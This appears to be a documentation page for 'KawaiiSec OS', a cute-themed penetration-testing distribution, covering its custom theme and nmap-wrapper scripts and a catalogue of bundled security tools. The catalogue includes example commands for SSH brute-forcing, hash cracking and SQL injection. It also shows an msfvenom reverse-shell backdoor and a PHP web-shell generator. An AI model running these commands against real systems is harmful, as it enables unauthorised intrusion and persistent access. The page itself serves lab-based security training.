---
id: tools
title: Tools & Scripts  
sidebar_label: Tools
---

# 🛠️ KawaiiSec OS Tools & Scripts

*Comprehensive security toolkit with kawaii aesthetics* ✨

---

## 🌸 KawaiiSec Custom Tools

### 🎨 animefetch.sh

Your adorable system info fetcher with kawaii chibi mascot.

#### 📂 Location:
```bash
/usr/local/bin/animefetch.sh
```

#### ▶️ Run it:
```bash
animefetch.sh
# or
./animefetch.sh
```

#### 📋 What it shows:
* Current user, host, uptime, OS, shell
* RAM usage on macOS (via vm_stat)
* Cute hacker chibi with cat-ears ASCII art
* System information with kawaii branding

#### 🧠 Features:
* **ASCII Mascot**: Adorable chibi hacker with cat ears
* **System Info**: Clean, colorful system information display  
* **Memory Usage**: Real-time memory stats (macOS compatible)
* **Skip Option**: Use `--no-ascii` to run without the mascot

---

### 🎨 uwu.zsh-theme

Kawaii terminal theme with pastel colors, git integration, and cute status indicators.

#### 📂 Location:
```bash
/usr/share/kawaiisec/themes/uwu.zsh-theme
```

#### 🌈 Features:

##### **✨ Enhanced Kawaii Prompt**
* **User Status**: 🌸 for regular users, 🐱 for root
* **Git Integration**: 🌿 branch display with status indicators
* **Exit Status**: (◕‿◕) for success, (╥﹏╥) for errors  
* **Time Display**: Sparkly timestamp on right prompt

##### **🎨 Color Palette**
* **Pink**: Bright kawaii pink (#D75F87)
* **Purple**: Lavender purple (#D787AF) 
* **Blue**: Baby blue (#87D7FF)
* **Mint**: Kawaii mint green (#AFFFAF)
* **Peach**: Soft peach (#FFD7AF)

##### **💖 Git Status Indicators**
* **Clean Repo**: 💖 (heart emoji)
* **Uncommitted Changes**: ✨ (sparkles emoji)
* **Branch Display**: 🌿 with branch name

##### **🎯 Built-in Kawaii Commands**
* `uwu` - Show kawaii motivation message
* `nyan` - Display cute cat face  
* `kawaii-help` - List available kawaii commands

#### 🔧 Installation:

##### **Automatic Installation (KawaiiSec OS):**
```bash
# Theme is pre-installed and configured
# Just restart your terminal or run:
source ~/.zshrc
```

##### **Manual Installation:**
```bash
# Copy theme to Oh My Zsh themes directory
sudo cp /usr/share/kawaiisec/themes/uwu.zsh-theme ~/.oh-my-zsh/custom/themes/

# Edit your ~/.zshrc
nano ~/.zshrc

# Set the theme
ZSH_THEME="uwu"

# Reload your shell
source ~/.zshrc
```

---

### 🌸 pinkmap.sh

Enhanced nmap wrapper with cross-platform sound effects and kawaii styling!

#### 📂 Location:
```bash
/usr/local/bin/pinkmap.sh
```

#### ▶️ Usage:
```bash
# Basic scan
pinkmap.sh <target-ip>

# Advanced scan with nmap options
pinkmap.sh <target-ip> [nmap-args]
```

#### 🌟 Features:

##### **🎨 Kawaii Visual Design**
* **ASCII Banner**: Beautiful bordered banner with kawaii styling
* **Color Palette**: Full rainbow of kawaii colors (pink, purple, mint, peach)
* **Progress Indicators**: Cute scan progress with kawaii messages
* **Result Formatting**: Boxed output with professional styling

##### **🔊 Cross-Platform Sound Effects**
* **macOS**: Uses system `Hero.aiff` sound automatically
* **Linux**: Uses custom `nani.mp3` with auto-detection of audio players
* **Smart Detection**: Automatically finds available audio players
* **Graceful Fallback**: Works even without sound support

##### **💪 Enhanced Features**
* **Dependency Check**: Verifies nmap installation automatically
* **Better Error Handling**: Clear error messages with installation help
* **Temp File Management**: Secure temporary file handling
* **Usage Examples**: Built-in help with common scan patterns

#### 📋 Examples:

```bash
# Basic host scan
pinkmap.sh 192.168.1.1

# SYN scan with OS detection  
pinkmap.sh 192.168.1.1 -sS -O

# Network discovery
pinkmap.sh 192.168.1.0/24 -sn

# Detailed service scan
pinkmap.sh 192.168.1.1 -sV -sC

# Stealth scan
pinkmap.sh 192.168.1.1 -sS -f -T2
```

---

## 🛡️ Security Tools Included

### 🔍 **Reconnaissance & Information Gathering**

#### **Network Discovery**
```bash
# Network scanning and enumeration
nmap -sS -sV -O <target>
masscan -p80,443,22,21 <target>
netdiscover -i eth0
```

#### **Web Application Reconnaissance**
```bash
# Web application discovery
dirb http://target.com
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt
nikto -h http://target.com
```

#### **Social Engineering**
```bash
# Social media intelligence
theHarvester -d target.com -b google
maltego
recon-ng
```

### 🎯 **Vulnerability Assessment**

#### **Network Vulnerability Scanners**
```bash
# Network vulnerability scanning
nessus
openvas
nexpose
qualys
```

#### **Web Application Scanners**
```bash
# Web application testing
owasp-zap
burpsuite
sqlmap
wpscan
```

#### **Wireless Security**
```bash
# WiFi penetration testing
aircrack-ng
kismet
reaver
wifite
```

### 💥 **Exploitation Tools**

#### **Exploitation Frameworks**
```bash
# Metasploit Framework
msfconsole
msfvenom
msfdb

# Custom exploit development
exploit-db
searchsploit
```

#### **Password Attacks**
```bash
# Password cracking
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://target
```

#### **Web Application Exploitation**
```bash
# SQL injection
sqlmap -u "http://target.com/page?id=1"

# XSS testing
xsser --url http://target.com

# File inclusion
lfi-toolkit
```

### 📊 **Post-Exploitation & Analysis**

#### **Privilege Escalation**
```bash
# Linux privilege escalation
linpeas.sh
linux-exploit-suggester
unix-privesc-check

# Windows privilege escalation
winpeas.bat
windows-exploit-suggester
```

#### **Data Exfiltration**
```bash
# Data extraction tools
exiftool
strings
binwalk
foremost
```

#### **Persistence & Backdoors**
```bash
# Backdoor creation
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=4444 -f exe > backdoor.exe
weevely generate password /path/to/backdoor.php
```

### 🔬 **Digital Forensics**

#### **Memory Forensics**
```bash
# Memory analysis
volatility -f memory.dmp imageinfo
volatility -f memory.dmp pslist
volatility -f memory.dmp netscan
```

#### **Disk Forensics**
```bash
# Disk analysis
autopsy
sleuthkit
photorec
testdisk
```

#### **Network Forensics**
```bash
# Network traffic analysis
wireshark
tshark
tcpdump
ngrep
```

### 🧪 **Lab Environment Tools**

#### **Vulnerable Machines**
```bash
# Lab setup commands
kawaiisec-lab setup dvwa
kawaiisec-lab setup juice-shop
kawaiisec-lab setup metasploitable
kawaiisec-lab setup vulnhub
```

#### **Docker Containers**
```bash
# Container management
docker run -d -p 8080:80 vulnerables/web-dvwa
docker run -d -p 3000:3000 bkimminich/juice-shop
docker run -d -p 8081:80 citizenstig/nowasp
```

#### **Network Isolation**
```bash
# Network configuration
kawaiisec-lab network isolate
kawaiisec-lab network bridge
kawaiisec-lab network nat
```

---

## 🎯 KawaiiSec Management Tools

### 🔧 **System Management**
```bash
# System information and configuration
kawaiisec-help system
kawaiisec-help tools
kawaiisec-help network
kawaiisec-help lab

# Theme management
kawaiisec-theme list
kawaiisec-theme set <theme-name>
kawaiisec-theme customize
```

### 🛡️ **Security Configuration**
```bash
# Security tool setup
kawaiisec-firewall setup
kawaiisec-ids configure
kawaiisec-logging setup
kawaiisec-automation setup
```

### 🧪 **Lab Management**
```bash
# Lab environment management
kawaiisec-lab init
kawaiisec-lab docker init
kawaiisec-lab network setup
kawaiisec-lab cleanup
```

---

## 🚀 Usage Tips

### 🛡️ **Ethical Hacking Guidelines**
* **Always get permission** before scanning networks
* **Use responsibly** - these are professional security tools
* **Stay legal** - only test systems you own or have authorization for
* **Learn continuously** - security is an ongoing journey
* **Document everything** - keep detailed notes of your testing

### 💖 **Kawaii Philosophy**
* **Stay cute** while staying secure
* **Make learning fun** with kawaii aesthetics  
* **Build community** - share your kawaii security setups
* **Hack responsibly** - cute tools, serious ethics

### 🎯 **Best Practices**
* **Regular updates**: Keep tools and system updated
* **Backup configurations**: Save your customizations
* **Use lab environments**: Practice safely in isolated networks
* **Document findings**: Keep detailed reports of security assessments
* **Stay current**: Follow security news and updates

---

## 🧁 Future Kawaii Tools

### 🚧 **Coming Soon**
* **`tsundere-cron`**: Sassy cron job manager with attitude
* **`waifu-firewall`**: Cute GUI frontend for ufw firewall
* **`kawaii-mascot`**: Interactive desktop mascot overlay
* **`anime-logger`**: Cute logging and monitoring system

### 💭 **Planned Features**
* **Live ISO builder** (Kali/Debian Testing based)
* **Preinstalled tools** in the OS image
* **Custom GRUB splash screen** with kawaii mascot
* **Installer automation** scripts

---

*Remember: With great power comes great responsibility... and adorable aesthetics! 🌸💖*

**Stay cute, stay secure! 💖** 